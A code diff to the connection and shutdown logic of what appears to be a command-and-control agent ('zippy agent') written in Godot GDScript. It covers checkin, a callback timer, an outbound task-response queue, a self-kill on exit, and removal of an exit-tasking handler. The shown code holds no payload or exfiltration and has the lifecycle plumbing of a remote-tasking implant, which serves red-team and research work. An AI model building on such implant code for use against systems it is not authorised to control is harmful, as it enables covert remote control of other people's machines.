@@ -111,6 +111,8 @@ func _process(delta):
 
 			if _client != null:
 				print("client closed %d --- %s\n" % [_client.get_close_code(), _client.get_close_reason()])
+				#_closed() ?
+				#_on_server_close() ?
 
 			if connect_attempt <= 0:
 				close_and_quit()
@@ -130,7 +132,7 @@ func _process(delta):
 			if _client.get_available_packet_count() > 0:
 				_on_data()
 
-			if $api.get("checkin_done") and not exiting:
+			if $api.get("checkin_done"):
 				time = 0
 
 				if ($CallbackTimer.do_callback and outbound.size() > 0) or do_exit:
@@ -148,9 +150,7 @@ func _process(delta):
 			if do_exit and outbound.size() <= 0:
 
 				_client.disconnect_from_host()
-
-				if exiting:
-					close_and_quit()
+				close_and_quit()
 
 func close_and_quit():
 	set_process(false)
@@ -159,25 +159,10 @@ func close_and_quit():
 
 	get_tree().quit()
 
+	OS.kill(OS.get_process_id())
+
 func _on_api_agent_response(payload):
 
 	if payload:
 		outbound.append(payload)
 
-func _on_tasking_exit(task):
-	do_exit = true
-
-	$api.send_agent_response(
-		$api.create_task_response(
-			true,
-			true,
-			task.get("id"),
-			"Any last words?",
-			[
-				[
-					"Process Destroy",
-					"zippy agent"
-				]
-			]
-		)
-	)
